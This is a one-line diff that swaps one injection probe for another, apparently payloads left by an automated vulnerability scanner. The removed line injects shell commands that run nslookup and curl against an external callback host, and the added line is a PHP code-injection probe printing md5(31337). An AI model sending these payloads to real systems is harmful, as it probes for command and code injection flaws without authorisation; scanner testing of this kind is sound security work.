@@ -1,1 +1,1 @@
-;(nslookup -q=cname hitatjkeucamv8d7b3.bxss.me||curl hitatjkeucamv8d7b3.bxss.me)|(nslookup -q=cname hitatjkeucamv8d7b3.bxss.me||curl hitatjkeucamv8d7b3.bxss.me)&(nslookup -q=cname hitatjkeucamv8d7b3.bxss.me||curl hitatjkeucamv8d7b3.bxss.me)
+';print(md5(31337));$a='
